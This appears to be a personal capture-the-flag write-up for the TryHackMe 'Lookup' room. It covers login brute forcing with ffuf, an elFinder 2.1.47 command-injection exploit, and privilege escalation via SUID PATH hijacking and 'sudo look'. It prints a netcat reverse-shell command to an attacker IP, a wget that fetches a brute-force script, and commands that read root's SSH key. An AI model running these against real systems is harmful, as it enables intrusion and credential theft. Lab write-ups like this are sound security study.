---
date: 2025-01-03
description: brute login, outdated web-app leading to RCE; misconfigured binaries
platform: TryHackMe
categories: Web, PrivEsc, Linux
tags:
  - vulnerable-components
  - brute-force/authentication
  - SUID
  - sudo
duration: 200 minutes
---
# Recon
login page
open ports 
```txt
Scanned at 2024-12-23 19:01:01 PST for 17s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## fuzzing 
- php files: none
    - index, login.php 
- regular fuzz: htaccess
- subdomain enumeration:
    - www 
    - vhost
    - subdomain.lookup.thm
- login bruteforce 
	- different response for valid/invalid username

# Brute Forcing credentials
```bash
ffuf -u http://lookup.thm/login.php -X POST -d "username=FUZZ&password=admin" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -fs 74 -c -t 120

ffuf -u http://lookup.thm/login.php -X POST -d "username=<u:redacted>&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fs 74 -c -t 120 -fs 62
```
> I can now login using `<u:redacted>:<p:redacted>`

check 
```bash
firefox lookup.thm
# searchsploit

elFinder Web file manager
Version: 2.1.47
```

# Gaining Access 
## Files Lookup
files.lookup.thm/elFinder/files/credentials.txt?_t=1712061058

credentials.txt think:nopassword 
not working ssh
## Exploit using metasploit 
```bash
use unix/webapp/elfinder_php_connector_exiftran_cmd_injection

shell 
busybox nc 10.13.15.144 1337 -e bash # nc -nvlp 8901
```

# PrivEsc part
- suid allowed seeing `/usr/sbin/pwm` that can be tricked into reading another users passwd file 
- privilege can be escalated using look # https://gtfobins.github.io/gtfobins/look/

```bash
# suids
find / -perm /4000 2>/dev/null
/usr/sbin/pwm

export PATH=/tmp$PATH
echo "uid=1000(think) gid=1000(think) groups=1000(think)" > id
chmod 777 id
# run pwm
# we see id configuration can just be manipulated 

# .password files is what?
wget http://10.13.15.144:8902/suBF.sh

# bruteForcing using suBF.sh
chmod +x suBF.sh
www-data@lookup:/tmp$ ./suBF.sh -u think -w think_pass.txt
# ::user:pass
ssh think@10.10.125.195
cat usr.txt

sudo -l

sudo look '' /root/root.txt
sudo look '' /root/.ssh/id_rsa

ssh -i root_id_rsa root@ip
```

![[_attachments/__Pasted image 20250103101453.png]]
![[_attachments/__Pasted image 20250103105835.png]]

# Vulnerabilities
- Weak brute-force protection 
    - Weak password policy 
- Vulnerable application `/elFinder 2.1.47` 
	- leading to Command Injection (PHP)/ RCE 
	- files lookup credential found (admin files accessible?)
		- creds under the file manager not working
- Weak file permissions sudo/pwm leading to privesc
	- SUID `/usr/sbin/pwm`
	- sudo `look`
	
# Notes
- some exploit codes are bad and even updated it is hard to run. check for other ways.
- sometimes bruteforcing is just the way to go
- tricking file with root permission into running injected file
```bash
export PATH=/tmp$PATH
echo "uid=1000(think) gid=1000(think) groups=1000(think)" > id
chmod 777 id 
```
- reading secret files `.ssh/id_rsa` 
> took a lot of time converting the python2 to python3 script it worked but it has bug during shell. metasploit version was better 